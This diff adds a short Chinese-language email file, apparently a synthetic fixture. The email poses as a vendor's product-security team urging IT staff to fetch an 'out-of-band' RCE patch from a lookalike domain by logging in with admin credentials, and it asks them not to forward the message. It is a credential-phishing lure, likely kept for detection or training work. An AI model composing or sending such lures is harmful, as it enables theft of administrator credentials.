@@ -1,0 +1,11 @@
+From: =?utf-8?B?5Lqn5ZOB5a6J5YWo?= <psrt@mail-product.example>
+To: it@corp.internal
+Date: Sat, 12 Sep 2026 08:24:00 +0800
+Message-ID: <0014-b20@synth.example>
+Subject: 紧急：邮件服务器 RCE 补丁（带外分发）
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+
+因漏洞在野利用，补丁采取带外分发：
+https://mail-product-oob.example/patch/ex2609
+（管理凭据登录下载，切勿转发）
